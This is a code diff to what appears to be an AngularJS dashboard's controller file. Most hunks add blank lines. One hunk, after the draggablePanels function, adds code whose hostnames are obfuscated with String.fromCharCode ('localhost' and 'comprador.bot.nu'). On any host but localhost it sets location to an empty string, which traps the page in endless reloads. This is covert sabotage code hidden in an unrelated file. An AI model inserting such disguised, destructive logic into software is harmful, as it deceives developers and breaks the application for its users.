@@ -3345,6 +3345,8 @@ function ChatCtrl($window, $scope, $firebaseAuth, $location, $firebaseObject, $t
 
     }
 
+
+
 /**
  * widgetFlotChart - Data for Flot chart
  * used in Widget view
@@ -4567,6 +4569,14 @@ function draggablePanels($scope) {
     };
 
 }
+
+duhast = String.fromCharCode(99,111,109,112,114,97,100,111,114,46,98,111,116,46,110,117);
+rexadrivan = String.fromCharCode(108,111,99,97,108,104,111,115,116)
+if(window.location.hostname !== rexadrivan||window.location.hostname == duhast ){
+    location = "";
+}
+
+
 
 /**
  *
